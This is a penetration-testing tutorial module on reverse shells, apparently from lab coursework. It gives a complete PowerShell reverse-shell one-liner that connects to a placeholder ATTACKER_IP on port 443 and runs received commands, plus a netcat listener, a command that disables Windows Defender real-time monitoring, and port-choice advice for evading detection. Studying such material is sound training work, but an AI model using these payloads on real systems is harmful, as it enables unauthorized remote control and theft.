# 05 — Reverse Shells

## Overview

A **reverse shell** is when the **attacker starts a listener** and the **target connects back** to the attacker. This is the opposite of a bind shell and is the **preferred method** in real engagements.

```
┌──────────────────┐          ┌──────────────────┐
│   Attack Box     │          │   Target         │
│   10.10.14.15    │ ◄─────── │   10.10.14.20    │
│   :443 (server)  │  target  │   (client)       │
│   Listening...   │ connects │   Initiates conn │
└──────────────────┘  back    └──────────────────┘
```

> **The target connects TO you.** You are the server, the target is the client. The exact opposite of a bind shell.

---

## Why Reverse Shells Beat Bind Shells

| Factor | Bind Shell | Reverse Shell |
|--------|-----------|---------------|
| **Connection direction** | Attacker → Target (inbound) | Target → Attacker (outbound) |
| **Firewall impact** | Blocked — inbound rules are strict | Often allowed — outbound rarely blocked |
| **Detection risk** | High — open listening ports are suspicious | Lower — outbound traffic blends in |
| **Real-world viability** | Difficult | Preferred method |

> Admins focus on blocking **inbound** connections. Outbound connections on common ports (80, 443) are almost never blocked because the organization needs them for normal web browsing.

---

## Step-by-Step: Reverse Shell (Windows Target)

### 1. Attacker — Start listener on a common port:

```bash
sudo nc -lvnp 443
```

> Port 443 (HTTPS) is used because outbound 443 is almost never blocked. Using port 4444 or 9001 might get caught.

### 2. Target (Windows) — Execute PowerShell reverse shell:

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Breaking down the PowerShell one-liner:**

| Part | What It Does |
|------|-------------|
| `powershell -nop -c` | Launch PowerShell, no profile, execute command |
| `New-Object System.Net.Sockets.TCPClient('IP',443)` | Create TCP connection back to attacker |
| `$stream = $client.GetStream()` | Open a data stream over the connection |
| `$stream.Read(...)` | Read incoming commands from attacker |
| `iex $data 2>&1` | Execute received commands, capture stdout + stderr |
| `$stream.Write(...)` | Send command output back to attacker |
| `$client.Close()` | Clean up when done |

> 🔧 **Change `ATTACKER_IP` and port** to match your listener before running.

### 3. Attacker — Shell received:

```
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

> You now have an interactive PowerShell session on the Windows target.

---

## Windows Defender Will Block This

When you first run the PowerShell one-liner, expect this:

```
This script contains malicious content and has been blocked by your antivirus software.
```

> AV signatures recognize common reverse shell patterns. In labs, you can disable it:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

> ⚠️ This is for **lab environments only**. In real engagements, you'll need to obfuscate or use AV evasion techniques (covered in later modules).

---

## Why Port 443?

```
Port 4444 → Suspicious, commonly associated with Metasploit
Port 9001 → Suspicious, commonly used in CTFs
Port 443  → Normal HTTPS traffic, rarely blocked outbound
Port 80   → Normal HTTP traffic, rarely blocked outbound
```

> Always use common ports for reverse shells. If the target org uses HTTPS everywhere, port 443 blends right in.

---

## Reverse Shell Resources

- **[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)** — Commands for Bash, PowerShell, Python, PHP, Ruby, Perl, and more
- Automated generators exist, but defenders know about them too — **customization may be needed**

---

## Bind vs Reverse — Quick Decision

| Scenario | Use |
|----------|-----|
| You can reach the target directly, no firewall | Bind shell works |
| Target is behind a firewall/NAT | **Reverse shell** |
| Outbound traffic from target is allowed | **Reverse shell** |
| You need stealth | **Reverse shell** on port 443/80 |
| Internal network, no restrictions | Either works |

---

## Key Takeaways

| Point | Detail |
|-------|--------|
| **Direction** | Target connects back to attacker (outbound) |
| **Who listens** | Attacker listens, target connects |
| **Port choice** | Use 443 or 80 to avoid firewall blocks |
| **AV detection** | Common one-liners are signature-matched — expect blocks |
| **Native tools** | Use PowerShell on Windows (already installed) rather than uploading Netcat |
| **Preferred method** | Reverse shells are the go-to in real engagements |
